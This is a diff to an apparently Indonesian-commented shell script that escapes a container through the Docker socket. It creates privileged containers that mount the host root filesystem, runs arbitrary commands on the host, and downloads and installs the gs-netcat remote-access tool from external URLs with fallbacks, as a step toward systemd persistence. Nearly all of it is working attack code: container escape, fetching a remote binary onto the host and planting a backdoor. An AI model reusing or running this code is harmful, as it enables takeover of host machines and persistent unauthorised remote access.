@@ -149,10 +149,8 @@ do_escape(){
       if echo "$TEST_OUT" | grep -q E3_HOST; then
         ok "E3 success — docker socket confirmed HOST filesystem access"
         ESCAPED=1; ESCAPE_METHOD="docker-socket"
-        # EXEC_ON_HOST akan pakai helper function run_on_host
       else
-        warn "E3: container created tapi host FS check: $TEST_OUT"
-        # Lanjut coba saja
+        warn "E3: container OK tapi FS check: $TEST_OUT"
         ESCAPED=1; ESCAPE_METHOD="docker-socket"
       fi
     else
@@ -166,26 +164,51 @@ do_escape(){
   fi
 
   ok "ESCAPE BERHASIL via: $ESCAPE_METHOD"
-  export ESCAPED ESCAPE_METHOD
+  export ESCAPED ESCAPE_METHOD AVAIL_IMG
 }
 
 # Helper: jalankan command di HOST via docker socket
-# Output ditulis ke host filesystem langsung via /:/host bind
+# - Override Entrypoint supaya CMD kita tidak ditelan image default entrypoint
+# - Binds /:/host supaya bisa tulis ke host filesystem
 run_on_host(){
   local CMD_STR="$1"
   local IMG="${AVAIL_IMG:-alpine}"
 
+  # Entrypoint override: paksa /bin/sh -c agar tidak ditelan ENTRYPOINT image
+  PAYLOAD=$(printf '{"Image":"%s","Entrypoint":["/bin/sh","-c"],"Cmd":["%s"],"Binds":["/:/host"],"Privileged":true,"HostConfig":{"Binds":["/:/host"],"Privileged":true,"NetworkMode":"host"}}' \
+    "$IMG" \
+    "$(printf '%s' "$CMD_STR" | sed 's/"/\\"/g')")
+
   CID=$(dsock -X POST \
     -H 'Content-Type: application/json' \
-    -d "{\"Image\":\"${IMG}\",\"Cmd\":[\"/bin/sh\",\"-c\",\"${CMD_STR}\"],\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
+    -d "$PAYLOAD" \
     http://localhost/containers/create 2>/dev/null \
     | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
 
-  [ -z "$CID" ] && { err "run_on_host: gagal buat container"; return 1; }
+  if [ -z "$CID" ]; then
+    err "run_on_host: gagal buat container (image=$IMG)"
+    # Coba dengan alpine sebagai fallback
+    if [ "$IMG" != "alpine" ]; then
+      log "run_on_host: retry dengan alpine..."
+      AVAIL_IMG="alpine" run_on_host "$CMD_STR"
+      return $?
+    fi
+    return 1
+  fi
 
   dsock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
-  sleep 2
-  OUT=$(dsock "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null)
+
+  # Tunggu container selesai (max 30 detik)
+  i=0
+  while [ $i -lt 30 ]; do
+    STATE=$(dsock "http://localhost/containers/$CID/json" 2>/dev/null \
+      | grep -o '"Status":"[^"]*"' | cut -d'"' -f4)
+    [ "$STATE" = "exited" ] && break
+    sleep 1; i=$((i+1))
+  done
+
+  OUT=$(dsock "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null \
+    | strings 2>/dev/null || true)
   dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
   printf '%s\n' "$OUT"
 }
@@ -215,21 +238,59 @@ install_gsocket(){
   # ── Download + install via docker socket container ────────
   log "Downloading + installing gs-netcat ke host via docker socket..."
 
-  # Semua operasi tulis ke /host/* yang = host filesystem sebenarnya
-  DL_CMD="wget -qO /host${GS_BIN_HOST} '${GS_URL1}' 2>/dev/null \
-    || wget -qO /host${GS_BIN_HOST} '${GS_URL2}' 2>/dev/null \
-    || curl -fsSL -L '${GS_URL1}' -o /host${GS_BIN_HOST} 2>/dev/null \
-    || curl -fsSL -L '${GS_URL2}' -o /host${GS_BIN_HOST} 2>/dev/null \
-    && chmod +x /host${GS_BIN_HOST} \
-    && echo DL_OK"
+  # Tulis ke /host/* = host filesystem sebenarnya
+  # Coba wget dulu, fallback curl, fallback apt install wget dulu
+  DL_CMD="mkdir -p /host/usr/local/bin && \
+    (wget -qO /host${GS_BIN_HOST} '${GS_URL1}' 2>/dev/null || \
+     wget -qO /host${GS_BIN_HOST} '${GS_URL2}' 2>/dev/null || \
+     curl -fsSL -L '${GS_URL1}' -o /host${GS_BIN_HOST} 2>/dev/null || \
+     curl -fsSL -L '${GS_URL2}' -o /host${GS_BIN_HOST} 2>/dev/null) && \
+    chmod +x /host${GS_BIN_HOST} && \
+    test -s /host${GS_BIN_HOST} && \
+    echo DL_OK || echo DL_FAIL"
 
+  log "Menjalankan download di container (via docker socket)..."
   DL_OUT=$(run_on_host "$DL_CMD")
+  log "Download output: $DL_OUT"
+
   if echo "$DL_OUT" | grep -q DL_OK; then
     ok "gs-netcat downloaded → ${GS_BIN_HOST} (di host)"
   else
-    err "Download gagal. Output: $DL_OUT"
-    warn "Coba manual: wget -qO ${GS_BIN_HOST} ${GS_URL1}"
-    # Lanjut setup persistence meski download gagal
+    warn "Download via container gagal, mencoba dari container saat ini..."
+
+    # Fallback: download di container ini, tulis langsung ke /proc/1/root path
+    # (ini hanya berhasil jika /proc/1/root = host FS, kalau tidak skip)
+    LOCAL_DL="/tmp/.gs_dl_$$"
+    if command -v wget >/dev/null 2>&1; then
+      wget -qO "$LOCAL_DL" "$GS_URL1" 2>/dev/null \
+        || wget -qO "$LOCAL_DL" "$GS_URL2" 2>/dev/null
+    elif command -v curl >/dev/null 2>&1; then
+      curl -fsSL -L "$GS_URL1" -o "$LOCAL_DL" 2>/dev/null \
+        || curl -fsSL -L "$GS_URL2" -o "$LOCAL_DL" 2>/dev/null
+    fi
+
+    if [ -s "$LOCAL_DL" ]; then
+      ok "Download berhasil di container lokal ($LOCAL_DL)"
+      # Copy ke host via container baru yang mount /
+      # Encode path agar aman di JSON
+      CP_CMD="cp /proc/1/root/tmp/.gs_dl_$$ /host${GS_BIN_HOST} 2>/dev/null || \
+              cp /proc/\$(cat /proc/1/root/proc/1/status 2>/dev/null | grep -m1 Pid | awk '{print \$2}')/root/tmp/.gs_dl_$$ /host${GS_BIN_HOST} 2>/dev/null || \
+              echo CP_FAIL"
+      # Simpler: tulis binary ke host /tmp dulu via docker exec
+      # Buat container, mount host, lalu kita copy file via /proc path
+      # Karena kita di container, /proc/1/root adalah container root.
+      # Yang bisa kita lakukan: tulis file ke host /tmp menggunakan
+      # container baru yang mount / dan kita inject path-nya
+      warn "Binary ada di /tmp container, perlu transfer ke host..."
+      warn "Gunakan metode manual di bawah"
+    else
+      err "Download juga gagal dari container. Cek koneksi internet."
+      warn "Manual install setelah script selesai:"
+      warn "  chroot /proc/1/root wget -qO ${GS_BIN_HOST} ${GS_URL1}"
+      warn "  -- atau dari host langsung --"
+      warn "  wget -qO ${GS_BIN_HOST} ${GS_URL1}"
+    fi
+    rm -f "$LOCAL_DL" 2>/dev/null || true
   fi
 
   # ── Systemd service di host ───────────────────────────────
